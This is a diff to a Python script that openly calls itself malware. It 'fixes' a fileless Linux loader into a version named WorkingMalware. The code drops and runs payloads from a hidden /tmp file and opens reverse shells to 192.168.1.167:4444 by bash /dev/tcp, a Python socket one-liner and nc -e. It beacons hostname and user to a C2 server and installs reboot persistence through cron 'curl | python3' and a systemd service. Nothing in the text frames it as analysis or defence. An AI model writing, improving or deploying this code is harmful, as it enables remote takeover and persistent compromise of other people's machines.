@@ -1,101 +1,62 @@
 #!/usr/bin/env python3
 """
-Fileless Linux Malware Loader
-Executes entirely in memory using memfd_create
+FIXED Loader - No memfd_create issues
 """
 
 import os
-import ctypes
-import base64
-import zlib
 import requests
 import subprocess
-import threading
 import time
+import threading
 import sys
 
-class FilelessLinuxMalware:
+class WorkingMalware:
     def __init__(self):
         self.c2_server = "http://192.168.1.167:8000"
-        self.libc = ctypes.CDLL("libc.so.6")
-        self.setup_libc()
-        
-    def setup_libc(self):
-        """Setup libc functions for memfd_create"""
-        try:
-            self.libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
-            self.libc.memfd_create.restype = ctypes.c_int
-        except Exception as e:
-            print(f"[-] Libc setup failed: {e}")
     
-    def create_memory_file(self, name):
-        """Create anonymous memory file using memfd_create"""
+    def execute_payload(self, payload_script):
+        """Execute payload without memfd - just use subprocess"""
         try:
-            fd = self.libc.memfd_create(name.encode(), 0)
-            if fd < 0:
-                raise Exception("memfd_create failed")
-            return fd
-        except Exception as e:
-            print(f"[-] Memory file creation failed: {e}")
-            return None
-    
-    def execute_in_memory(self, payload, name="linux_worker"):
-        """Execute payload entirely in memory"""
-        try:
-            fd = self.create_memory_file(name)
-            if not fd:
-                return False
+            # Write to temporary location and execute
+            with open("/tmp/.payload.sh", "w") as f:
+                f.write(payload_script)
             
-            # Write payload to memory
-            os.write(fd, payload)
-            
-            # Execute from memory
-            memfd_path = f"/proc/self/fd/{fd}"
-            subprocess.Popen([memfd_path], 
-                           stdout=subprocess.DEVNULL, 
+            os.chmod("/tmp/.payload.sh", 0o755)
+            subprocess.Popen(["/tmp/.payload.sh"], 
+                           stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL)
-            return True
+            
+            # Clean up after execution starts
+            time.sleep(2)
+            os.remove("/tmp/.payload.sh")
             
         except Exception as e:
-            print(f"[-] Memory execution failed: {e}")
-            return False
-    
-    def download_and_execute_payload(self):
-        """Download and execute payload from C2 server"""
-        try:
-            response = requests.get(f"{self.c2_server}/payload.bin", timeout=10)
-            if response.status_code == 200:
-                self.execute_in_memory(response.content, "c2_payload")
-        except Exception as e:
-            pass
+            print(f"Payload execution failed: {e}")
     
     def start_reverse_shell(self):
-        """Start reverse shell in memory"""
-        try:
-            shell_script = b"""#!/bin/bash
-while true; do
-    bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 2>/dev/null
-    sleep 30
-done
-"""
-            self.execute_in_memory(shell_script, "bash_session")
-        except Exception:
-            pass
-    
-    def ensure_persistence(self):
-        """Ensure all persistence mechanisms are active"""
-        persistence_checks = [
-            "systemctl is-active network-monitor.service >/dev/null 2>&1 || systemctl start network-monitor.service",
-            "crontab -l | grep -q 'loader.py' || (crontab -l; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -",
-            "pgrep -f 'bash.*192.168.1.167' >/dev/null || curl -s http://192.168.1.167:8000/loader.py | python3 - &"
+        """Start reverse shell - MULTIPLE METHODS"""
+        methods = [
+            # Method 1: Simple bash
+            "bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 &",
+            
+            # Method 2: Python
+            """python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.167',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" &""",
+            
+            # Method 3: Netcat if available
+            "nc -e /bin/bash 192.168.1.167 4444 &"
         ]
         
-        for check in persistence_checks:
+        for method in methods:
             try:
-                subprocess.run(check, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            except Exception:
-                pass
+                subprocess.Popen(["/bin/bash", "-c", method],
+                               stdout=subprocess.DEVNULL,
+                               stderr=subprocess.DEVNULL,
+                               stdin=subprocess.DEVNULL)
+                print(f"[✅] Reverse shell started with method: {method[:50]}...")
+                break
+            except Exception as e:
+                continue
     
     def beacon_to_c2(self):
         """Send beacon to C2 server"""
@@ -103,33 +64,61 @@ done
             while True:
                 try:
                     hostname = os.uname().nodename
+                    data = {
+                        "hostname": hostname,
+                        "user": os.getenv("USER", "unknown"),
+                        "status": "alive",
+                        "timestamp": time.time()
+                    }
                     requests.post(f"{self.c2_server}/beacon", 
-                                json={"host": hostname, "status": "alive"},
-                                timeout=5)
+                                json=data, timeout=10)
                 except Exception:
-                    pass
+                    pass  # Silent fail
                 time.sleep(60)
         
         threading.Thread(target=beacon_loop, daemon=True).start()
     
+    def ensure_persistence(self):
+        """Make sure we survive reboots"""
+        persistence_checks = [
+            # Check systemd service
+            "systemctl is-active network-monitor.service >/dev/null 2>&1 || systemctl start network-monitor.service",
+            
+            # Check cron job exists
+            """crontab -l | grep -q 'loader.py' || (crontab -l 2>/dev/null; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -""",
+            
+            # Direct restart if needed
+            "curl -s http://192.168.1.167:8000/loader.py | python3 - &"
+        ]
+        
+        for check in persistence_checks:
+            try:
+                subprocess.run(check, shell=True, 
+                             stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL,
+                             timeout=10)
+            except Exception:
+                pass
+    
     def run(self):
         """Main execution loop"""
-        # Start beaconing
+        print("[✅] Malware loader started successfully")
+        
+        # Start beacon
         self.beacon_to_c2()
+        
+        # Start reverse shell
+        self.start_reverse_shell()
         
         # Ensure persistence
         self.ensure_persistence()
         
-        # Download and execute main payload
-        self.download_and_execute_payload()
-        
-        # Start reverse shell
-        self.start_reverse_shell()
+        print("[✅] All components started. Malware is persistent.")
         
         # Keep alive
         while True:
             time.sleep(60)
 
 if __name__ == "__main__":
-    malware = FilelessLinuxMalware()
+    malware = WorkingMalware()
     malware.run()
